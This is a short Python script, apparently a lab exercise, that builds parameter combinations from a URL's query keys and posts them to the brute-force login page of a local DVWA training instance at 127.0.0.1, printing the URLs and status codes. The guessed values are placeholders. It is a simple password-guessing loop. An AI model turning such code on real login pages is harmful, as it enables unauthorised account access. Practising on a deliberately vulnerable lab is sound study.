import requests
from itertools import cycle 

def brutePost(url,list):
    for data in list:
        r=requests.post(url,params=data)
        print(r.url)
        print(r.status_code)

def makeHeads(url,split_ch):
    heads = [] 
    if url.find('?')>=0 :
        url = url[url.index('?')+1:]
    forms = url.split(split_ch)
    for form in forms:
        heads.append(form[:form.index('=')])    
    return heads


#args is a List which consits of lists args=[[],[]] 
def makeList(heads,num,args):      
    if len(heads)!=len(args):
        return None
    forms=[]
    cirs=list(map(cycle,args))    
    for k in range(num):
        data = {}
        for i in range(len(heads)):
            data[heads[i]]=next(cirs[i])
        forms.append(data)  
    return forms          
            
    

#brutePost("http://127.0.0.1/dvwa/vulnerabilities/brute/",[{'username':'value1','key2':'value2'}])
#brutePost()
heads =makeHeads('/dvwa/vulnerabilities/brute/?username=admin&password=sdad&Login=Login','&')
#print(heads)
#print(len(heads))
forms = makeList(heads,3,[[1,2,3],[1,3,2],[2,2,2]])
#print(forms)
brutePost("http://127.0.0.1/dvwa/vulnerabilities/brute/",forms)